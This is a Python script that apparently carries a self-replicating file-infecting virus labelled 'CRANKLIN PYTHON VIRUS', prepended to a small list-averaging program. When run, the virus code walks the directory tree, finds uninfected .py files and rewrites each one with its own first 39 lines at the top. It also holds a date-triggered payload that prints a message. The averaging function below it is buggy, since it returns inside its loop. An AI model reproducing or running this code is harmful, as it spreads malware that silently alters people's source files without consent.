#!/usr/bin/python
import os
import datetime
SIGNATURE = "CRANKLIN PYTHON VIRUS"
def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            filestoinfect.extend(search(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                filestoinfect.append(path+"/"+fname)
    return filestoinfect
def infect(filestoinfect):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if i>=0 and i <39:
            virusstring += line
    virus.close
    for fname in filestoinfect:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()
def bomb():
    if datetime.datetime.now().month == 1 and datetime.datetime.now().day == 25:
        print("HAPPY BIRTHDAY CRANKLIN!")
filestoinfect = search(os.path.abspath(""))
infect(filestoinfect)
bomb()
def avrglist(lst):
    l=len(lst)
    sum=n=0
    while n<l:
        sum=sum+lst[n]
        n=n+1
        average=sum/l
        return average


a=[5,6,1,3,7,8,9,5,1,3,4,5,6,9,8,74,21,3,89]
b=avrglist(a)
print(b)
